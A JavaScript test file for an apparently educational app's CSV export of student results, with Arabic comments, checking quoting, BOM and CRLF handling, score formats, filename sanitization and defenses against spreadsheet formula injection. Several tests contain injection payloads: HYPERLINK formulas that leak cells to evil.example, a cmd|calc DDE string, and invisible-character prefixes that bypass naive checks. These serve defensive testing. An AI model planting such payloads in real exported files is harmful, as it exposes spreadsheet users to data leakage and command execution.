import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  buildResultsCsv,
  csvCell,
  resultsCsvFileName,
  CSV_BOM,
  RESULTS_CSV_COLUMNS,
} from '../dist/index.js';

/*
 * تصدير النتائج — الطريق الوحيد الخارج من التطبيق.
 *
 * وأكثر ما يُفحص هنا ليس «هل خرج نصّ» بل **ماذا يفعل هذا النصّ حين يُفتح**:
 * ملفٌّ يقرؤه إكسل على جهاز المعلم، ثم يمشي إلى زميلٍ فيفتحه هو أيضاً. فالفحص
 * يقرأ الناتج كما يقرؤه محلّل CSV حقيقي لا كما يقرؤه إنسان متساهل.
 */

/**
 * محلّل CSV صغير بقواعد RFC4180 — الشاهد المستقلّ.
 *
 * فحصٌ يقارن النصّ بنصٍّ متوقَّع يثبت أنّ الشيفرة لم تتغيّر، ولا يثبت أنّ
 * الاقتباس **صحيح**. وهذا المحلّل يفكّ ما بناه المُصدِّر، فإن عادت الخلايا كما
 * دخلت فالاقتباس صحيح فعلاً.
 */
function parseCsv(text) {
  const body = text.startsWith(CSV_BOM) ? text.slice(CSV_BOM.length) : text;
  const rows = [];
  let row = [];
  let cell = '';
  let quoted = false;

  for (let index = 0; index < body.length; index += 1) {
    const char = body[index];

    if (quoted) {
      if (char !== '"') {
        cell += char;
      } else if (body[index + 1] === '"') {
        cell += '"';
        index += 1;
      } else {
        quoted = false;
      }
      continue;
    }

    if (char === '"' && cell === '') {
      quoted = true;
    } else if (char === ',') {
      row.push(cell);
      cell = '';
    } else if (char === '\r' && body[index + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      index += 1;
    } else {
      cell += char;
    }
  }

  if (cell !== '' || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

const QUESTIONS = [
  { id: 'q1', prompt: 'ما عاصمة الأردن؟' },
  { id: 'q2', prompt: '' },
];

function sample(rows, questions = QUESTIONS) {
  return buildResultsCsv({ questions, rows });
}

/* ── الترميز والشكل ────────────────────────────────── */

/*
 * علامة الترميز أولاً — وإلا فتح المعلم ملفاً كلّه رموز.
 * وموضعها يُفحص لا وجودها فقط: علامةٌ في وسط الملفّ محرفٌ داخل خليّة لا إعلان
 * ترميز، والملفّ يبقى خردة.
 */
test('الملفّ يبدأ بعلامة UTF-8 ثم بالترويسة مباشرةً', () => {
  const csv = sample([]);
  assert.equal(csv.codePointAt(0), 0xfeff);
  assert.equal(csv.indexOf(CSV_BOM, 1), -1);
  assert.ok(csv.startsWith(`${CSV_BOM}${RESULTS_CSV_COLUMNS[0]}`), csv.slice(0, 20));
});

test('والسطور تنتهي بـCRLF كما ينصّ RFC4180، وآخر سطرٍ منهيٌّ كغيره', () => {
  const csv = sample([
    { studentName: 'سارة', status: 'reviewed', submittedAt: '2026-09-04T08:20:00.000Z', score: 4 },
  ]);
  assert.ok(csv.endsWith('\r\n'));
  assert.equal(csv.split('\r\n').length - 1, 2);
  assert.equal(csv.includes('\n\n'), false);
});

/*
 * الترويسة عقدٌ مع جدول المعلم: هو يبني فوقها معادلات ويعيد التصدير كل حصة.
 * وتبدّل ترتيبٍ صامت يكسر ملفّه ولا يقول شيئاً.
 */
test('وترتيب الأعمدة ثابت: الأربعة الأولى ثم الأسئلة بترتيب النشاط', () => {
  const [header] = parseCsv(sample([]));
  assert.deepEqual(header, [...RESULTS_CSV_COLUMNS, 'ما عاصمة الأردن؟', 'سؤال ٢']);
});

test('وفصلٌ لم يسلّم فيه أحد يخرج بترويسةٍ وحدها لا بملفٍّ فارغ', () => {
  const rows = parseCsv(sample([]));
  assert.equal(rows.length, 1);
  assert.equal(rows[0].length, RESULTS_CSV_COLUMNS.length + QUESTIONS.length);
});

/* ── الاقتباس ──────────────────────────────────────── */

/*
 * العربية تكتب الفاصلة والقوسين المزدوجين في كل جملة تقريباً، وإجابةٌ طويلة
 * تُكتب بأسطر. وحقلٌ بفاصلةٍ غير مقتبس يصير عمودين — فتنزاح درجات الصفّ كلّه
 * عموداً واحداً، وهو خطأ يقرؤه المعلم بيانات لا عطلاً.
 */
test('الفاصلة والاقتباس والسطر تُقتبس وتُفكّ كما دخلت', () => {
  const answer = 'قال «مرحباً، يا صديقي» ثم قال "نعم"\nوانصرف';
  const csv = sample([
    {
      studentName: 'أحمد، عبدالله',
      status: 'submitted',
      submittedAt: '2026-09-04T08:20:00.000Z',
      score: null,
      answers: { q1: answer },
    },
  ]);

  const [, row] = parseCsv(csv);
  assert.equal(row[0], 'أحمد، عبدالله');
  assert.equal(row[4], answer);
  // الاقتباس الداخلي يُضاعَف — لا يُهرَّب بشرطة مائلة.
  assert.ok(csv.includes('""نعم""'), csv);
});

test('وحقلٌ بلا فاصلةٍ ولا اقتباس يُترك بلا اقتباس', () => {
  assert.equal(csvCell('عمّان'), 'عمّان');
  assert.equal(csvCell('إجابة فيها مسافات عادية'), 'إجابة فيها مسافات عادية');
});

/*
 * `\r` منفردٌ داخل حقلٍ مقتبس تقرؤه قارئاتٌ نهايةَ صفّ. وبلا توحيده ينشقّ
 * الصفّ إلى صفّين — أحدهما بأعمدةٍ ناقصة.
 */
test('و`\\r` المنفرد يُوحَّد فلا ينشقّ الصفّ', () => {
  const rows = parseCsv(
    sample([
      {
        studentName: 'ليان',
        status: 'submitted',
        submittedAt: null,
        score: null,
        answers: { q1: 'سطر\rسطر' },
      },
    ]),
  );
  assert.equal(rows.length, 2);
  assert.equal(rows[1][4], 'سطر\nسطر');
});

/* ── حقن الصيغ — الفحص الأمني ─────────────────────── */

/*
 * **هذا هو الفحص الذي وُجدت هذه الوحدة لأجله.**
 *
 * إجابةٌ نصّية تبدأ بـ`=` ليست نصّاً عند إكسل بل برنامجاً ينفّذه على جهاز
 * المعلم حين يفتح الملفّ. و`HYPERLINK` تسرّب محتوى خلايا إلى عنوانٍ خارجي.
 * والملفّ يُشارَك — فيصل ما كتبه طالبٌ إلى أجهزة أخرى.
 */
test('إجابةٌ تبدأ بـ= تُحيَّد فلا تصير صيغةً تعمل عند المعلم', () => {
  const attack = '=HYPERLINK("http://evil.example/?x="&A1;"اضغط هنا")';
  const rows = parseCsv(
    sample([
      {
        studentName: 'خالد',
        status: 'submitted',
        submittedAt: '2026-09-04T09:00:00.000Z',
        score: null,
        answers: { q1: attack },
      },
    ]),
  );

  const cell = rows[1][4];
  assert.equal(cell.startsWith('='), false, cell);
  assert.equal(cell, `'${attack}`);
});

test('وكذلك + و- و@ والجدولة والإرجاع — كلّها بادئات صيغة', () => {
  for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
    const cell = csvCell(`${lead}cmd|' /c calc'!A1`);
    const bare = cell.startsWith('"') ? cell.slice(1, -1) : cell;
    assert.equal(bare.startsWith("'"), true, `لم يُحيَّد: ${JSON.stringify(lead)}`);
  }
});

/*
 * علامة الاتجاه تسبق العربية كثيراً، وإكسل يتجاهلها ثم ينفّذ ما بعدها.
 * ففحصُ أول محرفٍ حرفياً يمرّر الهجوم كاملاً وهو يظنّ أنه فحص.
 */
test('وعلامة الاتجاه قبل `=` لا تخفي الصيغة عن الفحص', () => {
  const cell = csvCell('\u200F=1+1');
  const bare = cell.startsWith('"') ? cell.slice(1, -1) : cell;
  assert.equal(bare.startsWith("'"), true, JSON.stringify(cell));
});

test('وإجابةٌ عربية بريئة لا تُمسّ بفاصلةٍ عليا', () => {
  assert.equal(csvCell('عمّان هي العاصمة'), 'عمّان هي العاصمة');
  assert.equal(csvCell('لا أعرف'), 'لا أعرف');
});

/*
 * التحييد يحمي ولا يمحو: الملفّ سجلّ ما كتبه الطالب، ومحاولةٌ كهذه يستحقّ
 * المعلم أن يراها لا أن تُحذف من تحته.
 */
test('والتحييد يُبقي النصّ كاملاً ولا يبتر ما كتبه الطالب', () => {
  const attack = '=1+1';
  const [, row] = parseCsv(
    sample([
      {
        studentName: 'نور',
        status: 'submitted',
        submittedAt: null,
        score: null,
        answers: { q1: attack },
      },
    ]),
  );
  assert.ok(row[4].includes(attack), row[4]);
});

/* ── الأرقام والخلايا الفارغة ──────────────────────── */

/*
 * الدرجة يجمعها إكسل ويرتّبها. و«٥» عنده نصٌّ لا عدد: `AVERAGE` تعود صفراً
 * والفرز يصير أبجدياً — بلا رسالة خطأ واحدة. فالرقم اللاتيني هنا صوابٌ لا
 * مخالفة لقاعدة `ar()`.
 */
test('الدرجة تخرج برقمٍ لاتينيّ يحسبه إكسل، لا برقمٍ عربيّ يقرؤه نصّاً', () => {
  const [, row] = parseCsv(
    sample([
      {
        studentName: 'ريم',
        status: 'reviewed',
        submittedAt: '2026-09-04T08:20:00.000Z',
        score: 5,
      },
    ]),
  );
  assert.equal(row[3], '5');
  assert.equal(/[٠-٩]/u.test(row[3]), false);
});

/*
 * `AVERAGE` تتخطّى الخليّة الفارغة وتحسب الصفر. فصفرٌ مكتوب لمن لم يسلّم
 * يُنزل معدّل الفصل، والمعلم يقرأه تحصيلاً وهو غياب.
 */
test('ومن لم يسلّم: خليّة درجةٍ فارغة لا صفر، ووقتٌ فارغ لا اختراع', () => {
  const [, row] = parseCsv(
    sample([{ studentName: 'فهد', status: 'missing', submittedAt: null, score: null }]),
  );
  assert.equal(row[1], 'لم يرسل بعد');
  assert.equal(row[2], '');
  assert.equal(row[3], '');
});

test('والوقت يُصاغ بشكلٍ يرتّبه إكسل زمنياً، وختمٌ تالف يترك الخليّة فارغة', () => {
  const rows = parseCsv(
    sample([
      { studentName: 'أ', status: 'submitted', submittedAt: '2026-09-04T08:20:00.000Z', score: 1 },
      { studentName: 'ب', status: 'submitted', submittedAt: 'ليس ختماً', score: 2 },
    ]),
  );
  assert.equal(rows[1][2], '2026-09-04 08:20');
  assert.equal(rows[2][2], '');
});

/*
 * أرقام الطالب تُنقل كما كتبها: الملفّ سجلٌّ لإجابته لا صياغةٌ لها.
 */
test('وأرقام الطالب العربية تمرّ كما كتبها ولا تُحوَّل', () => {
  const [, row] = parseCsv(
    sample([
      {
        studentName: 'هند',
        status: 'submitted',
        submittedAt: null,
        score: null,
        answers: { q1: 'المسافة ٤٥ كم' },
      },
    ]),
  );
  assert.equal(row[4], 'المسافة ٤٥ كم');
});

test('والسؤال بلا إجابةٍ خليّةٌ فارغة لا فجوة في الصفّ', () => {
  const [header, row] = parseCsv(
    sample([
      {
        studentName: 'وليد',
        status: 'submitted',
        submittedAt: null,
        score: null,
        answers: { q2: 'إجابة الثاني' },
      },
    ]),
  );
  assert.equal(row.length, header.length);
  assert.equal(row[4], '');
  assert.equal(row[5], 'إجابة الثاني');
});

/* ── الخلوص ───────────────────────────────────────── */

/*
 * الخلوص يُفحص ولا يُوعَد به: دالّةٌ تعدّل ما دخلها تعمل مرةً وتخطئ في
 * الثانية، والتجميد يكشفها فوراً.
 */
test('الدالّة لا تمسّ ما دخلها وتعطي الناتج نفسه في كل نداء', () => {
  const input = Object.freeze({
    questions: Object.freeze([Object.freeze({ id: 'q1', prompt: 'س' })]),
    rows: Object.freeze([
      Object.freeze({
        studentName: 'مي',
        status: 'reviewed',
        submittedAt: '2026-09-04T08:20:00.000Z',
        score: 3,
        answers: Object.freeze({ q1: 'إجابة' }),
      }),
    ]),
  });

  const first = buildResultsCsv(input);
  const second = buildResultsCsv(input);
  assert.equal(first, second);
});

/* ── اسم الملفّ ────────────────────────────────────── */

test('اسم الملفّ يحمل العنوان والختم وينتهي بـcsv', () => {
  const name = resultsCsvFileName({
    activityTitle: 'اختبار الوحدة الأولى',
    at: '2026-09-04T08:20:00.000Z',
  });
  // ختمٌ يُقرأ من النصّ لا من `Date`: يجب أن يخرج هكذا في أي منطقة زمنية.
  assert.equal(name, 'نتائج-اختبار الوحدة الأولى-2026-09-04_08-20.csv');
});

/*
 * `/` و`\` و`:` في اسمٍ يعني على ويندوز فشلَ حفظٍ برسالةٍ لا يفهمها المعلم،
 * أو كتابةً في مجلدٍ آخر.
 */
test('ومحارف المسار الممنوعة تُنزع فلا يفشل الحفظ ولا يخرج الملفّ من مجلده', () => {
  const name = resultsCsvFileName({
    activityTitle: '../نشاط: مراجعة/الفصل الأول *',
    at: '2026-09-04T08:20:00.000Z',
  });
  for (const bad of ['/', '\\', ':', '*', '?', '"', '<', '>', '|']) {
    assert.equal(name.includes(bad), false, `${bad} في ${name}`);
  }
  assert.ok(name.endsWith('.csv'), name);
});

test('وعنوانٌ كلّه محارف ممنوعة يُبقي اسماً صالحاً لا اسماً فارغاً', () => {
  const name = resultsCsvFileName({ activityTitle: '///', at: '2026-09-04T08:20:00.000Z' });
  assert.equal(name, 'نتائج-2026-09-04_08-20.csv');
});

test('وختمٌ لا يُقرأ يُسقط الوقت ولا يخترع وقتاً كاذباً', () => {
  const name = resultsCsvFileName({ activityTitle: 'مراجعة', at: '' });
  assert.equal(name, 'نتائج-مراجعة.csv');
});

/* ── حدود التحييد ─────────────────────────────────── */

/*
 * حدُّ الحماية يُثبَّت من الجهتين: الجدولة تُحيَّد ولو تلاها نصٌّ بريء — لأنّ
 * إكسل يقصّها ويقرأ ما بعدها — والمسافة العادية لا تُحيَّد، وإلا حملت نصفُ
 * إجابات الفصل فاصلةً عليا لا سبب لها.
 */
test('الجدولة في الأول تُحيَّد ولو تلاها نصٌّ بريء', () => {
  const cell = csvCell('\tعمّان');
  assert.equal(cell, '"\'\tعمّان"');
});

test('والمسافة العادية تُقتبس ولا تُحيَّد', () => {
  assert.equal(csvCell(' عمّان'), '" عمّان"');
});

/*
 * `NUL` وأخواته تقطع عندها قارئاتٌ فيضيع باقي الملفّ صامتاً — والصمت أسوأ من
 * العطل: المعلم يرى جدولاً ناقصاً ويظنّه كاملاً.
 */
test('ومحارف التحكّم تُنزع ويبقى النصّ حولها', () => {
  assert.equal(csvCell('عمّان\u0000ي'), 'عمّاني');
});

/*
 * لقطةٌ حرفية للملفّ كلّه: تمسك أيّ تبدّلٍ في العلامة أو الفاصل أو نهاية
 * السطر — وهي الثلاثة التي يفشل الملفّ بأيٍّ منها عند المعلم لا عندنا.
 */
test('والشكل النهائي كاملاً: علامة ثم ترويسة ثم صفّ، بفواصل وCRLF', () => {
  const csv = buildResultsCsv({
    questions: [{ id: 'q1', prompt: 'س' }],
    rows: [
      {
        studentName: 'مي',
        status: 'reviewed',
        submittedAt: '2026-09-04T08:20:00.000Z',
        score: 3,
        answers: { q1: 'عمّان' },
      },
    ],
  });

  assert.equal(
    csv,
    `${CSV_BOM}الطالب,الحالة,وقت التسليم,الدرجة,س\r\n` +
      'مي,صُحّحت,2026-09-04 08:20,3,عمّان\r\n',
  );
});

/* ── ما يعبر من خارج TypeScript ───────────────────── */

/*
 * محرف تحكّمٍ واحد قبل `=` كان يمرّر الهجوم كاملاً: الحكم يقع على النصّ الخام
 * فيراه بادئاً بمحرفٍ لا يفتح صيغة، ثم يحذف التنظيفُ ذلك المحرف — فتصل إلى
 * القرص خليّةٌ أولها `=` بلا فاصلةٍ عليا. والفرق بين الممنوع والمارّ محرفٌ لا
 * يُرى، والنتيجة صيغةٌ تعمل عند كل من يفتح الملفّ.
 */
test('ومحرف تحكّمٍ قبل `=` لا يهرّب صيغةً من تحت الحكم', () => {
  const attack = '=HYPERLINK("http://evil.example/?leak="&A2&B2&C2,"press")';
  assert.equal(csvCell(`\u0001${attack}`), csvCell(attack));

  const [, row] = parseCsv(
    sample([
      {
        studentName: 'خالد',
        status: 'submitted',
        submittedAt: '2026-09-04T09:00:00.000Z',
        score: null,
        answers: { q1: `\u0001${attack}` },
      },
    ]),
  );
  assert.equal(row[4], `'${attack}`);
});

/*
 * والثقب لم يكن محرفاً واحداً بل ثمانيةً وعشرين: كل ما يحذفه التنظيف ولا
 * تعرفه بادئات الخطر. وواحدٌ منها يكفي، فتُفحص حدودُ المدى لا محرفٌ منه.
 */
test('وكلّ محرفٍ يحذفه التنظيف يُفحص لا واحدٌ منه', () => {
  for (const code of [0x00, 0x01, 0x08, 0x0e, 0x1f, 0x7f]) {
    const cell = csvCell(`${String.fromCodePoint(code)}=1+1`);
    const bare = cell.startsWith('"') ? cell.slice(1, -1) : cell;
    assert.equal(bare, "'=1+1", `لم يُحيَّد: U+${code.toString(16)}`);
  }
});

/*
 * والباب نفسه مفتوحٌ من جهة نصّ السؤال لا الإجابة وحدها: الترويسة تمرّ على
 * الخليّة نفسها، وصيغةٌ فيها تعمل عند كل من يستلم الملفّ.
 */
test('ونصّ السؤال يُحيَّد كما تُحيَّد الإجابة', () => {
  const [header] = parseCsv(
    buildResultsCsv({ questions: [{ id: 'q1', prompt: '\u0001=1+1' }], rows: [] }),
  );
  assert.equal(header[4], "'=1+1");
});

/*
 * `U+0085` كان يعبر الدفاعات الأربع كلّها: ليس بادئة صيغة، و`\s` لا يشمله،
 * ورقمه فوق حدّ محارف التحكّم فلا يُحذف، و`trim` لا يقصّه. فصيغةٌ خلفه لا
 * يراها فحصٌ من الأربعة.
 */
test('و`U+0085` قبل `=` لا يخفي الصيغة عن الفحص', () => {
  const cell = csvCell('\u0085=1+1');
  const bare = cell.startsWith('"') ? cell.slice(1, -1) : cell;
  assert.equal(bare.startsWith("'"), true, JSON.stringify(cell));
});

/*
 * وهو في وسط الحقل نهايةُ سطرٍ عند قارئاتٍ عدّة: حقلٌ غير مقتبس ينشقّ صفّين،
 * أحدهما بأعمدةٍ مزاحة يقرؤها المعلم درجاتٍ لطالبٍ آخر.
 */
test('و`U+0085` في وسط الحقل يُقتبس فلا يشقّ صفّاً', () => {
  const cell = csvCell('سطر\u0085سطر');
  assert.equal(cell.startsWith('"'), true, JSON.stringify(cell));
});

/*
 * الدرجة تصل نصّاً `'5'` من عمودٍ نصّيّ أو من `IPC`، وكانت تُمحى صامتة —
 * والخليّة الفارغة في هذا الملفّ بالذات تعني «لم يسلّم». فدرجةُ طالبٍ كانت
 * تصير غياباً، ولا شيء في الملفّ يقول إنّ شيئاً ضاع.
 */
test('ودرجةٌ وصلت نصّاً تُكتب رقماً ولا تصير غياباً', () => {
  const [, row] = parseCsv(
    buildResultsCsv({
      questions: [],
      rows: [
        {
          studentName: 'ب',
          status: 'reviewed',
          submittedAt: '2026-09-04T08:20:00.000Z',
          score: '5',
        },
      ],
    }),
  );
  assert.equal(row[3], '5');
});

/* ووعاء الدرجة لا يغيّرها: `bigint` من عدّاد، ورقمٌ عربيّ من حقلٍ نصّيّ. */
test('وكذلك `bigint` والرقم العربيّ — ويخرجان لاتينيَّين يحسبهما إكسل', () => {
  const score = (value) =>
    parseCsv(
      buildResultsCsv({
        questions: [],
        rows: [{ studentName: 'ب', status: 'reviewed', submittedAt: null, score: value }],
      }),
    )[1][3];

  assert.equal(score(5n), '5');
  assert.equal(score('٥'), '5');
});

/*
 * و`Date` يصل من سائق قاعدة البيانات ومن `IPC`، فكان وقت التسليم يُمحى ويصير
 * المسلِّم غائباً. ويُقرأ بـ`toISOString` وحدها: مخرجها UTC دائماً، فلا تدخل
 * ساعةُ الجهاز من بابها ويبقى الناتج واحداً في كل منطقة زمنية.
 */
test('وختمٌ وصل كائن `Date` يُقرأ ولا يُمحى', () => {
  const [, row] = parseCsv(
    buildResultsCsv({
      questions: [],
      rows: [
        {
          studentName: 'ب',
          status: 'reviewed',
          submittedAt: new Date('2026-09-04T08:20:00.000Z'),
          score: 1,
        },
      ],
    }),
  );
  assert.equal(row[2], '2026-09-04 08:20');
});

/*
 * وما لا يُقرأ رقماً لا يصير فراغاً: الفراغ كذبٌ يقرؤه المعلم غياباً. والخطأ
 * يسمّي الصفّ وصاحبه، فيصحّح المعلم سجلّاً واحداً بدل أن يفقد ملفّ الفصل.
 */
test('ودرجةٌ لا تُقرأ رقماً تُوقف التصدير باسم صاحبها', () => {
  assert.throws(
    () =>
      buildResultsCsv({
        questions: [],
        rows: [{ studentName: 'خالد', status: 'reviewed', submittedAt: null, score: {} }],
      }),
    (error) => {
      assert.equal(error.code, 'results_row_invalid');
      assert.equal(error.field, 'الدرجة');
      assert.equal(error.row, 1);
      assert.ok(error.message.includes('خالد'), error.message);
      return true;
    },
  );
});

/*
 * وصفٌّ باسمٍ `null` — من تهجيرٍ ناقص أو من صفٍّ يتيم — كان يُسقط ملفّ الفصل
 * كلّه بـ`TypeError` لا تسمّي أحداً: فلا تصديرَ ولا دليلَ على السبب.
 */
test('وصفٌّ باسمٍ ناقص لا يُسقط ملفّ الفصل كلّه', () => {
  const rows = parseCsv(
    buildResultsCsv({
      questions: [{ id: 'q1', prompt: 'س' }],
      rows: [
        { studentName: null, status: 'submitted', submittedAt: null, score: 1 },
        { studentName: 12, status: 'submitted', submittedAt: null, score: 1, answers: { q1: 42 } },
      ],
    }),
  );

  assert.equal(rows.length, 3);
  assert.equal(rows[1][0], '');
  assert.equal(rows[2][0], '12');
  assert.equal(rows[2][4], '42');
});

/*
 * وحالةٌ لا يعرفها الجدول تصل من قاعدة البيانات بعد تبدّل مخطَّط: النوع وعدٌ
 * عند الترجمة لا حارسٌ عند التشغيل. وكانت تُسقط الملفّ كلّه، فتُكتب الآن كما
 * جاءت — لفظٌ غريب يُسأل عنه خيرٌ من غيابٍ لم يقع.
 */
test('وحالةٌ لا يعرفها الجدول تُكتب كما جاءت ولا تُسقط الملفّ', () => {
  const [, row] = parseCsv(
    sample([{ studentName: 'أ', status: 'graded', submittedAt: null, score: 1 }]),
  );
  assert.equal(row[1], 'graded');
});

/*
 * وحالةٌ اسمها `toString` تقرأ دالّةً من سلسلة النماذج لا `undefined` — فحصُ
 * الوجود بـ`??` لا يمسكها أصلاً.
 */
test('وحالةٌ باسم عضوٍ موروث لا تُقرأ من سلسلة النماذج', () => {
  const [, row] = parseCsv(
    sample([{ studentName: 'أ', status: 'toString', submittedAt: null, score: 1 }]),
  );
  assert.equal(row[1], 'toString');
});

/*
 * ومعرّف سؤالٍ اسمه `toString` كان يقرأ دالّةً من `Object.prototype` فلا يعمل
 * `??` ويسقط التصدير. والمعرّفات تأتي من المعلم ومن استيراد نشاط — لا كلّها
 * من اختيارنا.
 */
test('ومعرّف سؤالٍ باسم عضوٍ موروث يعطي خليّةً فارغة لا انهياراً', () => {
  for (const id of ['toString', 'constructor', '__proto__', 'valueOf', 'hasOwnProperty']) {
    const [, row] = parseCsv(
      buildResultsCsv({
        questions: [{ id, prompt: 'س' }],
        rows: [
          { studentName: 'أ', status: 'submitted', submittedAt: null, score: 1, answers: {} },
        ],
      }),
    );
    assert.equal(row[4], '', id);
  }
});

/*
 * والقصّ بوحدات UTF-16 يشقّ الوجه التعبيريّ نصفين فيبقى نصفُ زوجٍ بديل: اسمٌ
 * لا ينجو من دورة UTF-8. فيختلف الاسم المحفوظ عن المعروض عن نسخة النسخ
 * الاحتياطي — ثلاثتها لملفٍّ واحد، والمعلم يبحث عن ملفٍّ لا يجده.
 */
test('وعنوانٌ يقع وجهٌ تعبيريّ على حدّ قصّه يخرج باسمٍ صالح', () => {
  const name = resultsCsvFileName({
    activityTitle: `${'T'.repeat(59)}\u{1F600}b`,
    at: '2026-09-04T08:20:00.000Z',
  });

  assert.equal(Buffer.from(name, 'utf8').toString('utf8'), name);
  assert.equal(/[\uD800-\uDFFF]/u.test(name), false, JSON.stringify(name));
});

/*
 * و`U+202E` يقلب ترتيب ما بعده في مدير الملفات، فيقرأ المعلم اسماً غير الذي
 * حُفظ. و`U+200F` يعطي اسمين لا فرق بينهما بالعين وهما ملفّان — فيُفتح أحدهما
 * ظنّاً أنه الآخر. والوحدة تنزع هذا الصنف من الخليّة، فتركُه في الاسم تناقض.
 */
test('وعلامات الاتجاه وعديم العرض تُنزع من اسم الملفّ كما تُنزع من الخليّة', () => {
  const at = '2026-09-04T08:20:00.000Z';
  const plain = resultsCsvFileName({ activityTitle: 'مراجعة', at });

  for (const mark of ['\u202E', '\u200F', '\u200B', '\u2066']) {
    assert.equal(
      resultsCsvFileName({ activityTitle: `${mark}مراجعة`, at }),
      plain,
      JSON.stringify(mark),
    );
  }
});
